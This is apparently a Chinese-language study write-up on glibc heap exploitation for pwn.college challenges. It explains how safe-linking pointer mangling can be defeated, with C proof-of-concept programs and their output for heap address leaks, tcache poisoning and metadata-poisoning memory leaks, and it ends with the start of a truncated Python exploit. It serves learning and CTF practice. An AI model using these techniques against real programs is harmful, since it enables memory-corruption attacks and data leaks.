<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>

<p>对于第二个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>, 是最后一个进入该桶的堆块指针, 这个指针是没有加密的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>

<h4 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h4><h5 id="safe-linking-UAF"><a href="#safe-linking-UAF" class="headerlink" title="[safe-linking] UAF"></a>[safe-linking] UAF</h5><p>假设我们有<code>UAF</code>的能力,如果想要泄露一个堆块的地址,还需要什么信息?</p>
<blockquote>
<p>“我们有<code>UAF</code>的能力”,说的更直白一些,就是在堆块释放回到<code>tcache</code>之后,可以打印泄露其<code>next</code>字段的值</p>
</blockquote>
<p>假设<code>tcache</code>为空,chunk1,chunk2,chunk3大小相同</p>
<p><strong>现在<code>free(chunk1)</code>释放回<code>tcache</code></strong></p>
<p><code>free</code> 前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>

<p><code>free</code>后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>

<p>即使我们有<code>chunk1</code>的<code>UAF</code>,也只能知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>右移计算不可逆,低位数据已经丢失</p>
<p>我们能做的只能是利用<code>UAF</code>获取<code>chunk1.next</code>,也就是获取<code>chunk1</code>所在的虚拟页框号</p>
<p><strong>接着<code>free(chunk2)</code></strong></p>
<p><code>free</code>前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>

<p><code>free</code> 后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>

<p>又<code>chunk1</code>和<code>chunk2</code>距离比较近,在同一页上,因此两者的虚拟页框号相同,也即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>那么有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>

<p>又异或运算可逆,因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>



<p><strong>同理,如果继续<code>free(chunk3)</code></strong></p>
<p>可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>

<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>





<h5 id="safe-linking-tcache-entry-poisoning"><a href="#safe-linking-tcache-entry-poisoning" class="headerlink" title="[safe-linking] tcache entry poisoning"></a>[safe-linking] tcache entry poisoning</h5><p>如果还想象往日一样,往一个被释放进入<code>tcache</code>的堆块上挂不干净的东西<code>fake_chunk</code></p>
<p>首先为了满足<code>tcache.counts[idx]</code>的约束,需要堆里至少有两块,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>

<p>接下来考虑修改<code>chunk2.next</code> 指向<code>fake_chunk</code></p>
<p>修改完之后<code>tcache</code>的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>这种状态<strong>可以看作</strong><code>tcache</code>从<strong>空</strong>到先<code>free(fake_chunk)</code>然后<code>free(chunk2)</code>之后的状态,诚如是,可以从头开始考虑:</p>
<p>在<code>free(fake_chunk)</code>之后,<code>tcache</code>中的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>

<p>此时<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>

<p>又<code>chunk2_mem &gt;&gt; 12</code>就是<code>chunk2</code>的虚拟页框号,其值等于<code>chunk1.next</code>,因此可以在<code>fake_chunk</code>上链前,先计算得知该值</p>
<p>又<code>fake_chunk_mem</code>是我们已知的目标地址,</p>
<p>因此<code>chunk2.next</code>计算可得</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//结构体自动对齐到sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>



<h5 id="safe-linking-metadata-poisoning-memory-leak"><a href="#safe-linking-metadata-poisoning-memory-leak" class="headerlink" title="[safe-linking] metadata poisoning memory leak"></a>[safe-linking] metadata poisoning memory leak</h5><p>使用<code>tcache entry poisoning</code>之后一直<code>malloc</code>把假堆块拿出来</p>
<p>此时<code>fake_chunk.next</code>值会被“解密”然后挂载<code>tcache.entries[idx]</code></p>
<p>具体过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>当<code>fake_chunk</code>要从链条上拿走时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//ep就是桶子头</span><br><span class="line">e = *ep				//e 就是fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//新ep指向</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>

<p>我们想要泄露的是<code>fake_chunk.next</code>,</p>
<p>现在我们知道的是<code>fake_chunk_addr</code></p>
<p>还需要知道一个<code>tcache-&gt;entries[tc_idx]</code></p>
<p>接下来再释放一个堆块<code>chunk0</code>进入<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>

<p>因此最终得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>



<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>



<p>注意glibc2.35之后堆块的对齐要求, 堆块的地址必须是0x10对齐的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>

<p>但是glibc2.31及之前是可以对齐到0x8的</p>
<h3 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc-2.35"></a>glibc-2.35</h3><p>ubuntu22.04上使用glibc-2.35,其数据结构与算法基本上和glibc2.38相</p>
<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><table>
<thead>
<tr>
<th>ubuntu发行版</th>
<th>glibc版本</th>
<th>调试工具</th>
</tr>
</thead>
<tbody><tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody></table>
<blockquote>
<p>pwndbg for ubuntu18.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>pwndbg for ubuntu20.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1-UAF"><a href="#level1-UAF" class="headerlink" title="level1 - UAF"></a>level1 - UAF</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2 -"></a>level2 -</h3><h3 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h3><p><code>secret </code>位于 <code>0x427C72</code></p>
<p>然而<code>malloc</code>检查地址必须在<code>0x430000</code>之上</p>
<p>如此一来, <strong>通过<code>UAF tcache poisoning</code>把<code>0x427C72</code>作为假堆块挂到<code>tcache</code>中, 然后<code>malloc</code>拿出来打印其内容</strong>的思路就失效了, 因为<code>malloc </code>不让我们拿出这个假堆块来</p>
<p>虽然我们拿不出假堆块来,但是投毒会传染给元数据</p>
<p><strong>具体来说:</strong></p>
<p>1.通过<code>UAF</code>对<code>tcache</code>中的真堆块投毒,使得 <strong>假堆块@0x427C72</strong> 进入<code>tcache</code></p>
<p>2.<code>malloc </code>拿出真堆块</p>
<p>3.<code>malloc </code>拿出假堆块, </p>
<p>此时假堆块的<code>next</code>值,就是<code>secret[0-7]</code></p>
<p>此时假堆块的<code>key</code>值,就是<code>secret[8-15]</code></p>
<p><code>tcache</code>元数据会继承 <strong>假堆块.next</strong>,</p>
<p>并且假堆块在被重新分配时,<code>key</code>值会被置零,也就是说<code>secret[8-15] = 0</code></p>
<p>4.重复上述步骤,但是这次<strong>假堆块@0x427C72 - 8</strong></p>
<p>如此<code>secret[0-7]</code>也会被置0</p>
<p>如此一来,我们根本不需要知道<code>secret</code>是多少,直接放零蛋</p>
<blockquote>
<p>glibc2.31中,tcache的堆块不会有对齐要求</p>
<p>同样的思路在glibc2.35上就更加困难了,一个是有safe-linking ,二个是tcache堆块必须对齐到0x10</p>
<p>glibc2.35中可以泄露低8字节,归零高8字节</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 